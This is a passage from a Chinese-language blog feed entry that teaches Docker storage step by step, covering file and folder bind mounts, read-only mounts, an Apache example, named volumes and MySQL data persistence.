type="1"><li>查看配置结果</li></ol><p>容器重启之后，我们再次进入控制台查看属性值，会发现新的属性值已经生效。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2ey5hqlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-2ey5hqlmrh9u69"><pre><code class="hljs shell">docker exec -it mysql mysql -uroot -p[MYSQL密码]show variables like 'general_log';exit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122050783249_178_image-20230905213126926.png" alt="image-20230905213126926"><figcaption aria-hidden="true">image-20230905213126926</figcaption></figure><h3 id="容器的文件系统挂载">容器的文件系统挂载</h3><h3 id="容器的共享挂载">容器的共享挂载</h3><p>在上一个实验我们学习了容器的配置和存储的几种基本用法，在实验中我们发现相比较文件复制，文件挂载的用法更加的便捷。这种方法也是我们在实际应用中常用的方法。</p><p>在本实验中我们来继续学习文件系统挂载的进一步知识。</p><ol type="1"><li>实验准备</li></ol><p>当我们使用<code>docker cp</code>向容器中复制文件时，会以宿主机中的文件为样本向容器中复制一个文件的副本。在复制完成之后宿主机和容器中的文件是没有关联的。</p><p>但是当我们使用文件挂载的时候，宿主机和容器中的文件的关系更像是linux中的硬链接。也就是虽然看起来是两个文件，但是双方实际上在<strong>共享同一个物理文件</strong>。本小节中我们将学习并验证容器的共享挂载能力。</p><p>首先我们先来做实验准备，首先我们先创建一个本地文件<code>share.txt</code>，然后让容器挂载这个文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sl0zqxlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-sl0zqxlmrh9u69"><pre><code class="hljs shell">echo '宿主机初始化文件' &gt; share.txtdocker run -itd --name share1 -v $(pwd)/share.txt:/share.txt busyboxdocker exec share1 cat /share.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122053619676_734_image-20230905214440354.png" alt="image-20230905214440354"><figcaption aria-hidden="true">image-20230905214440354</figcaption></figure><ol start="2" type="1"><li>本地修改文件</li></ol><p>当宿主机和容器双方共享同一个物理文件，这就意味着双方都可以修改文件的内容，且在另一方生效。下面我们在宿主机方修改<code>share.txt</code>文件，并在容器端验证文件修改是否生效。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mrntmalmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-mrntmalmrh9u69"><pre><code class="hljs shell">echo '从宿主机中修改文件' &gt;&gt; share.txtdocker exec share1 cat /share.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122056313837_145_image-20230905214532760.png" alt="image-20230905214532760"><figcaption aria-hidden="true">image-20230905214532760</figcaption></figure><ol start="3" type="1"><li>容器中修改文件</li></ol><p>同样我们也可以在在容器端修改share.txt文件，并在宿主机方验证文件修改。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6bg2iplmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-6bg2iplmrh9u69"><pre><code class="hljs shell">docker exec share1 sh -c "echo '从容器中修改文件' &gt;&gt; /share.txt"cat share.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122100915140_351_image-20230905214555887.png" alt="image-20230905214555887"><figcaption aria-hidden="true">image-20230905214555887</figcaption></figure><h3 id="挂载的权限配置">挂载的权限配置</h3><ol type="1"><li>容器挂载的权限</li></ol><p>如果用户希望控制文件在容器中是否可以被修改，那么可以用<code>rw</code>或者<code>readwrite</code>参数将挂载文件设置为读写权限，或者使用<code>ro</code>或者<code>readonly</code>参数设置为只读权限。如果文件被设置为的文件，那么只有在宿主机侧才可以进行修改。</p><p>先重置实验环境：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yubidclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-yubidclmrh9u69"><pre><code class="hljs shell">docker rm -f $(docker ps -aq)</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9rtklalmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-9rtklalmrh9u69"><pre><code class="hljs shell">echo '宿主机初始化文件' &gt; share.txtdocker run -itd --name share-readonly -v $(pwd)/share.txt:/share.txt:ro busyboxdocker exec share-readonly cat /share.txt</code></pre></div></div><blockquote><p>注：<code>&gt;</code>：覆盖重定向，<code>&gt;&gt;</code>：追加重定向</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122106103843_206_image-20230905215029607.png" alt="image-20230905215029607"><figcaption aria-hidden="true">image-20230905215029607</figcaption></figure><ol start="2" type="1"><li>验证只读权限</li></ol><p>接下来我们来验证只读挂载属性，我们分别在宿主机和容器中尝试修改文件，会发现在share-readonly容器中，我们无法修改文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u0lv19lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-u0lv19lmrh9u69"><pre><code class="hljs shell">echo '从宿主机中修改文件' &gt;&gt; share.txtdocker exec share-readonly cat /share.txtdocker exec share-readonly sh -c "echo '从只读容器中修改文件' &gt;&gt; /share.txt"cat share.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122108599300_956_image-20230905215129674.png" alt="image-20230905215129674"><figcaption aria-hidden="true">image-20230905215129674</figcaption></figure><ol start="3" type="1"><li>多个容器同时挂载一个文件</li></ol><p>宿主机中一个文件，可以挂载到多个不同的容器，每个容器在挂载时可以设定不同的挂载权限，我们再来创建一个容器，并使用读写权限挂载share.txt文件。</p><p>挂载成功后我们尝试分别在读写权限容器和只读权限容器中修改文件。不同的容器可以使用不同的权限挂载同一个文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wyy3oulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-wyy3oulmrh9u69"><pre><code class="hljs shell">echo '宿主机初始化文件' &gt; share.txtdocker run -itd --name share-readwrite -v $(pwd)/share.txt:/share.txt:rw busyboxdocker exec share-readonly sh -c "echo '从只读容器中修改文件' &gt;&gt; /share.txt"docker exec share-readwrite sh -c "echo '从读写容器中修改文件' &gt;&gt; /share.txt"cat share.txtdocker exec share-readonly cat /share.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122113368297_956_image-20230905220547182.png" alt="image-20230905220547182"><figcaption aria-hidden="true">image-20230905220547182</figcaption></figure><h3 id="文件夹的挂载">文件夹的挂载</h3><p>除了挂载文件之外，我们还可以挂载文件夹到容器上，当宿主机的文件或者文件夹挂载到容器时。如果容器的挂载点上已经存在同名的文件夹对象，则容器挂载点上的对象会被<strong>屏蔽</strong>。</p><ol type="1"><li>实验准备</li></ol><p>为了演示挂载文件夹，我们先创建本地文件夹<code>mount</code>，并在文件夹中添加一个文件<code>mount\text</code>。然后再制作一个新的容器镜像，在容器中创建一个文件<code>/mount</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iuwm4clmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-iuwm4clmrh9u69"><pre><code class="hljs shell">mkdir mountecho '宿主机中的文件' &gt; mount/hostvi Dockerfile</code></pre></div></div><p>我们使用vi 编辑Dockerfile文件：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r2n676lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-r2n676lmrh9u69"><pre><code class="hljs shell">FROM busybox:latestRUN mkdir mountRUN echo '容器中的文件' &gt; /mount/image</code></pre></div></div><ol start="2" type="1"><li>挂载文件夹</li></ol><p>接下来我们构建容器镜像，并使用该镜像创建容器。在创建容器时，我们将mount挂载到容器中。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jaq8gtlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-jaq8gtlmrh9u69"><pre><code class="hljs shell">docker build -t folder .docker run -itd --name folder1 -v $(pwd)/mount:/mount folder</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122116918938_377_image-20230905221232424.png" alt="image-20230905221232424"><figcaption aria-hidden="true">image-20230905221232424</figcaption></figure><ol start="3" type="1"><li>验证文件夹挂载</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mrbxtllmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-mrbxtllmrh9u69"><pre><code class="hljs shell">docker exec folder1 ls /mountdocker exec folder1 cat /mount/host</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122119641893_184_image-20230905221441505.png" alt="image-20230905221441505"><figcaption aria-hidden="true">image-20230905221441505</figcaption></figure><h3 id="apache挂载案例">Apache挂载案例</h3><p>在前面的小节中，我们讲解了文件夹挂载的基本用法，接下来我们来看一个实际的案例。在这个案例中我们在容器中启动一个Apache网页服务器。同时为了保证网页可以动态更新，我们将宿主机中的一个文件夹绑定到服务中的存放网页的文件夹上。这样外部应用只需要更新宿主机中的网页文件夹，就可以动态的为容器中的服务更新网页。</p><ol type="1"><li>实验准备</li></ol><p>首先我们在宿主机中创建一个文件夹<code>webfile</code>，然后通过<code>echo &gt;</code>命令在文件夹中生成一个简单的纯文本网页<code>index.html</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-i0siaflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-i0siaflmrh9u69"><pre><code class="hljs shell">mkdir webfileecho '默认网页' &gt; ./webfile/index.html</code></pre></div></div><ol start="2" type="1"><li>挂载网页文件夹</li></ol><p>然后我们在启动服务时，通过<code>-v</code>参数将宿主机中的文件夹，覆盖挂载到Apache容器的<code>/usr/local/apache2/htdocs</code>目录上；并且通过端口映射将容器中的服务发布到宿主机的<code>8000</code>端口上。</p><p>容器启动成功之后，我们通过<code>curl</code>命令访问<code>127.0.0.1:8000</code>验证容器服务。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8dshyhlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-8dshyhlmrh9u69"><pre><code class="hljs shell">docker run -itd --name file_server1 -p 8000:80 \ -v /root/webfile:/usr/local/apache2/htdocs httpdcurl 127.0.0.1:8000</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122121908293_573_image-20230905221837730.png" alt="image-20230905221837730"><figcaption aria-hidden="true">image-20230905221837730</figcaption></figure><ol start="3" type="1"><li>动态修改网页</li></ol><p>当容器启动后，我们在宿主机中修改<code>/webfile/index.html</code>文件，同时创建一个新文件<code>/webfile/host.html</code>，然后通过<code>curl</code>命令验证，发现宿主机中的修改，对容器中的Apache服务已经生效。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-siqahmlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-siqahmlmrh9u69"><pre><code class="hljs shell">echo '修改默认网页' &gt;&gt; ./webfile/index.htmlecho '添加Host页面' &gt; ./webfile/host.htmlcurl 127.0.0.1:8000curl 127.0.0.1:8000/host.html</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122125472121_394_image-20230905221908534.png" alt="image-20230905221908534"><figcaption aria-hidden="true">image-20230905221908534</figcaption></figure><h2 id="容器中的volume卷">容器中的volume卷</h2><h3 id="volume挂载简介">Volume挂载简介</h3><p>在上面的实验中我们为大家介绍了如何在容器中挂载文件和文件夹，这种采用绝对路径，直接挂载宿主机中的文件或者文件夹的方法又叫<code>bind mount</code>。这种方式比较适合将宿主机中的文件共享到容器中的场景。</p><p>除此之外docker还提供了另一种<code>volume</code>的方式进行挂载。这种方式通常会先在宿主机中通过dockervolume命令创建一个具有名称的volume，然后再将这个volume挂载到容器中。</p><p>相比较于bindmount方式，这种方式在使用的时候完全使用docker命令，并不需要像bindmount方式那样依赖于宿主机的绝对目录，主要用于将容器中的数据持久化保存到宿主机中。</p><ol type="1"><li>创建volume</li></ol><p>在使用volume之间，通常需要先通过<code>docker volume create</code>命令创建volume。该命令的格式为<code>docker volume create [volume名]</code>，和bindmount方式不同的是，volume创建之后默认并没有内容。这里我们创建名为<code>file-vol</code>的volume。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w60niwlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-w60niwlmrh9u69"><pre><code class="hljs shell">docker volume create file-vol</code></pre></div></div><ol start="2" type="1"><li>挂载volume</li></ol><p>在volume创建好之后，我们就可以通过docker run的-v参数进行挂载。在使用-v参数挂载volume时，用volume名称代替宿主机路径即可。这里我们创建并启动一个busybox容器，并将<code>file-vol</code>挂载到<code>/file</code>目录。</p><p>在容器创建之后，我们向volume挂载的文件夹中写入一个文件<code>/file/text</code>。验证挂载成功。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0a5xhqlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-0a5xhqlmrh9u69"><pre><code class="hljs shell">docker run -itd --name vol1 -v file-vol:/file busyboxdocker exec vol1 sh -c "echo '向volume中写入文件' &gt; /file/text"docker exec vol1 ls /filedocker exec vol1 cat /file/text</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122128026982_637_image-20230905222708156.png" alt="image-20230905222708156"><figcaption aria-hidden="true">image-20230905222708156</figcaption></figure><ol start="3" type="1"><li>查看volume信息</li></ol><p>当我们在容器的挂载点中保存数据之后，数据文件会被写入到volume中，这时我们可以通过<code>docker volume inspect</code>或者<code>docker inspect</code>来查看volume的信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-381sf5lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-381sf5lmrh9u69"><pre><code class="hljs shell">docker volume inspect file-vol</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122131531627_519_image-20230905222835618.png" alt="image-20230905222835618"><figcaption aria-hidden="true">image-20230905222835618</figcaption></figure><h3 id="volume的持久化">Volume的持久化</h3><p>在上一个小节中我们介绍了volume的基本用法。在容器中我们使用volume的主要作用，是为容器中的文件提供一种持久化的保存方法。</p><p>在前面讲解容器基本用法的时候，我们了解到每一个容器都是一个轻量级的虚拟机，在容器中创建的文件和宿主机以及其他容器并没有关系。如果容器被删除了，那么容器上的文件也就都丢失了。但是在某些情况下，我们在容器中存放了有价值的文件，比如数据库，邮件服务器，文件备份等。这个时候我们就希望能有一种即使容器被销毁了文件还可以存在的技术。这就是volume持久化的由来。</p><ol type="1"><li>删除容器</li></ol><p>接下来我们来验证volume的持久化能力。我们停止并删除刚才创建的容器<code>vol1</code>。在删除之后我们查看名为file-vol的volume。我们会发现容器的删除并不会影响volume的存在。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7wo7jrlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-7wo7jrlmrh9u69"><pre><code class="hljs shell">docker stop vol1docker rm -f vol1docker volume inspect file-vol</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122135953291_496_image-20230905223042132.png" alt="image-20230905223042132"><figcaption aria-hidden="true">image-20230905223042132</figcaption></figure><ol start="2" type="1"><li>重用volume</li></ol><p>然后我们再创建一个新的容器vol2，并将<code>file-vol</code>挂载到另一个目录<code>/file-other</code>上。由于之前的容器把数据存储在了volume中，因此新容器中的<code>/file-other</code>目录中保存vol1容器中的数据。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ukb5y4lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ukb5y4lmrh9u69"><pre><code class="hljs shell">docker run -itd --name vol2 -v file-vol:/file-other busyboxdocker exec vol2 ls /file-otherdocker exec vol2 cat /file-other/text</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122139537200_575_image-20230905223318221.png" alt="image-20230905223318221"><figcaption aria-hidden="true">image-20230905223318221</figcaption></figure><ol start="3" type="1"><li>volume的多重绑定</li></ol><p>如同容器可以使用多个端口绑定，容器在启动时也可以使用多个-v参数绑定多个volume，同时一个volume也可以同时绑定到多个容器中。在容器绑定volume之后，我们还可以通过<code>docker inspec</code>t命令通过容器筛选Mounts字段查看volume的信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zm8yirlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zm8yirlmrh9u69"><pre><code class="hljs shell">docker volume create ext-voldocker run -itd --name vol3 -v ext-vol:/ext -v file-vol:/file busybox docker inspect -f "{{json .Mounts}}" vol3 | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122144097385_795_image-20230905223606048.png" alt="image-20230905223606048"><figcaption aria-hidden="true">image-20230905223606048</figcaption></figure><h3 id="volume的常用命令">Volume的常用命令</h3><p>在前面的小节中我们学习了volume的持久化，本小节我们再来学习一下volume相关的一些命令。</p><ol type="1"><li>查看整体磁盘占用</li></ol><p>在docker中，占用磁盘的对象包括容器镜像，容器，volume等，我们还可以通过<code>docker system df -v</code>命令可以查看所有对象的的磁盘占用。</p><p>如果docker的镜像，容器，或者volume对象较多，则可以使用-f参数添加过滤器来筛选具体某一个volume的信息。下面的命令可以筛选出名为<code>file-vol</code>的volume的过滤器的信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wjny0blmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-wjny0blmrh9u69"><pre><code class="hljs shell">docker system df -vdocker system df -v --format=\'{{range .Volumes}}{{if eq .Name "file-vol"}}\{{.Name}} - {{.Size}}\n{{end}}{{end}}'</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122148633154_903_image-20230905223927214.png" alt="image-20230905223927214"><figcaption aria-hidden="true">image-20230905223927214</figcaption></figure><ol start="2" type="1"><li>自动创建volume</li></ol><p>当我们使用<code>docker run</code>创建容器并使用<code>-v</code>挂载volume的时候，如果需要加载的volume还没有被创建，则<code>docker run</code>会自动创建volume。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tio9welmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tio9welmrh9u69"><pre><code class="hljs shell">docker run -itd --name vol4 -v auto-vol:/auto busybox docker inspect auto-vol</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122153361471_217_image-20230905224103151.png" alt="image-20230905224103151"><figcaption aria-hidden="true">image-20230905224103151</figcaption></figure><ol start="3" type="1"><li>volume的自动删除</li></ol><p>docker也提供了删除所有当前没有被挂载的volume的指令<code>docker volume prune</code>，需要注意的是使用此指令时需要小心，防止数据被误删除！下面的代码可以删除全部的容器，并清空所有的volume。下面的例子我们演示了删除所有的容器，并且删除所有的volume：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c158m9lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-c158m9lmrh9u69"><pre><code class="hljs shell">docker rm -f $(docker ps -aq) docker volume prune -adocker volume ls</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122155893833_356_image-20230905224733590.png" alt="image-20230905224733590"><figcaption aria-hidden="true">image-20230905224733590</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122158059102_164_image-20230905224722864.png" alt="image-20230905224722864"><figcaption aria-hidden="true">image-20230905224722864</figcaption></figure><h3 id="在mysql中使用volume">在MySQL中使用Volume</h3><p>上面的小节中，我们学习了volume的相关知识，本小节中我们来演示一个通过volume管理MySQL容器的例子。</p><ol type="1"><li>volume的自动创建</li></ol><p>事实上当我们在使用<code>docker run -v</code>创建数据挂载时，如果没有预先创建volume，docker会自动创建对应的volume，如果用户连volume名称都没有指定，docker会自动为volume分配名称。</p><p>接下来我们直接创建名为mysql1的mysql容器，在容器创建成功后接入mysql控制台。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qixrpclmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-qixrpclmrh9u69"><pre><code class="hljs shell">docker run -itd --name mysql1 -v db-vol:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=[MYSQL密码] mysqldocker exec -it mysql1 mysql -uroot -p[MYSQL密码]</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122201439818_823_image-20230905225110593.png" alt="image-20230905225110593"><figcaption aria-hidden="true">image-20230905225110593</figcaption></figure><ol start="2" type="1"><li>操作数据库</li></ol><p>在一个MySQL服务中，可以包含多个数据库，每一个数据库中又可以包含多个数据表。每一个数据表中又可以包含多个数据行。</p><p>接下来我们再控制台中通过<code>CREATE DATABASE</code>创建一个新数据库<code>ali_db</code>，创建数据库之后需要通过<code>USE</code>命令选中要操作的数据库，然后通过<code>CREATE TABLE</code>命令在<code>ali_db</code>中添加一个数据表<code>ali_tab</code>，接下来使用<code>INSERT INTO</code>在数据表中添加一条记录。最后使用<code>SELECT</code>命令查询数据表中的记录。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-689rs0lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-689rs0lmrh9u69"><pre><code class="hljs shell">CREATE DATABASE ali_db;USE ali_db;CREATE TABLE ali_tab (`name` VARCHAR(100));INSERT INTO ali_tab VALUES('aliyun');SELECT * FROM ali_tab;exit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122206199441_275_image-20230905225127175.png" alt="image-20230905225127175"><figcaption aria-hidden="true">image-20230905225127175</figcaption></figure><ol start="3" type="1"><li>重用MySQL数据库</li></ol><p>接下来我们删除mysql1容器，删除之后在创建另一个名为mysql2的mysql容器。mysql2容器创建成功后进入mysql控制台，在控制台中通过<code>USE</code>命令选择数据库，然后用<code>SELECT</code>命令查看数据记录。会发现数据库中记录仍存存在。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7yh5a5lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-7yh5a5lmrh9u69"><pre><code class="hljs shell">docker rm -f mysql1docker run -itd --name mysql2 -v db-vol:/var/lib/mysql \-e MYSQL_ROOT_PASSWORD=[MYSQL密码] mysqldocker exec -it mysql2 mysql -uroot -p[MYSQL密码]</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122208927409_686_image-20230905225310167.png" alt="image-20230905225310167"><figcaption aria-hidden="true">image-20230905225310167</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tandd4lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tandd4lmrh9u69"><pre><code class="hljs shell">USE ali_db;SELECT * FROM ali_tab;exit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AD%98%E5%82%A8%E6%A8%A1%E5%9E%8B/20230906122211511426_681_image-20230905225330187.png" alt="image-20230905225330187"><figcaption aria-hidden="true">image-20230905225330187</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Docker应用-Docker网络模型</title>
    <link href="/posts/36160/"/>
    <url>/posts/36160/</url>
    
